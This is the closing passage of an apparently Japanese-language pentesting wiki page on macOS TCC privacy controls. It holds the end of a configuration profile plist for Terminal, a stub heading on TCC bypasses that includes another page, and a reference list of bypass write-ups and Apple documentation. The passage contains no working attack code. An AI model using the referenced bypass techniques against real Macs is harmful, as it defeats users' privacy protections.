				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCCのバイパス


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [macOS TCC.dbを深掘り - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.maclを追跡するスクリプト（brunerdによるGist）](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.maclを追跡して対処する](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [偶然と設計によるmacOS TCCユーザープライバシー保護のバイパス](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [ホームディレクトリを変更してTCCをバイパスする（別名CVE-2020-27937）](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [TCCにおけるSQL Injection：そして（おそらく）セキュリティリスクではなかった理由（今回は）](https://wts.dev/posts/tcc-sql-injection/)
- [7] [macOSにおけるTCC.dbの場所と取得方法](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [macOS App Sandboxの設定](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [カメラのentitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Appleデバイス向けPrivacy Preferences Policy Controlデバイス管理ペイロード設定](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [macOSへの侵入をおとりから侵害まで解剖する](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
